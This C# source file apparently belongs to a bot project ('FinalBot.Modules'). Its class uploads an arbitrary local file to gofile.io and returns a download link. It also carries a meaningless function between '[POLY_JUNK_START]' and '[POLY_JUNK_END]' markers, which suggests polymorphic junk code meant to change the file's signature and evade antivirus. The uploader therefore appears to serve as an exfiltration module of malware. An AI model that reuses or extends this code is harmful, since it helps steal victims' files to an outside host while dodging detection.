using System;
using System.IO;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;

namespace FinalBot.Modules
{
    public static class CloudUploader
    {
        // [POLY_JUNK_START]
        private static void _vanguard_cloud_init() {
            Random r = new Random();
            int seed = r.Next(100, 999);
            if (seed < 0) Console.WriteLine("Init:" + seed);
        }
        // [POLY_JUNK_END]

        private static readonly HttpClient _httpClient = new HttpClient { Timeout = TimeSpan.FromMinutes(10) };

        public static async Task<string> UploadFileAsync(string filePath)
        {
            try
            {
                if (!File.Exists(filePath)) return null;

                // 1. Get the best server
                string server = await GetBestServerAsync();
                if (string.IsNullOrEmpty(server)) server = "store1"; // Fallback

                // 2. Prepare the upload
                using var form = new MultipartFormDataContent();
                using var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read);
                using var streamContent = new StreamContent(fileStream);
                
                form.Add(streamContent, "file", Path.GetFileName(filePath));

                // 3. Perform upload
                string uploadUrl = $"https://{server}.gofile.io/uploadFile";
                var response = await _httpClient.PostAsync(uploadUrl, form);
                
                if (!response.IsSuccessStatusCode) return null;

                string jsonResponse = await response.Content.ReadAsStringAsync();
                using var doc = JsonDocument.Parse(jsonResponse);
                
                if (doc.RootElement.TryGetProperty("status", out var status) && status.GetString() == "ok")
                {
                    if (doc.RootElement.TryGetProperty("data", out var data) && 
                        data.TryGetProperty("downloadPage", out var downloadPage))
                    {
                        return downloadPage.GetString();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[CLOUD ERROR] {ex.Message}");
            }
            return null;
        }

        private static async Task<string> GetBestServerAsync()
        {
            try
            {
                var response = await _httpClient.GetAsync("https://api.gofile.io/getServer");
                if (!response.IsSuccessStatusCode) return null;

                string jsonResponse = await response.Content.ReadAsStringAsync();
                using var doc = JsonDocument.Parse(jsonResponse);

                if (doc.RootElement.TryGetProperty("status", out var status) && status.GetString() == "ok")
                {
                    if (doc.RootElement.TryGetProperty("data", out var data) && 
                        data.TryGetProperty("server", out var server))
                    {
                        return server.GetString();
                    }
                }
            }
            catch { }
            return null;
        }
    }
}
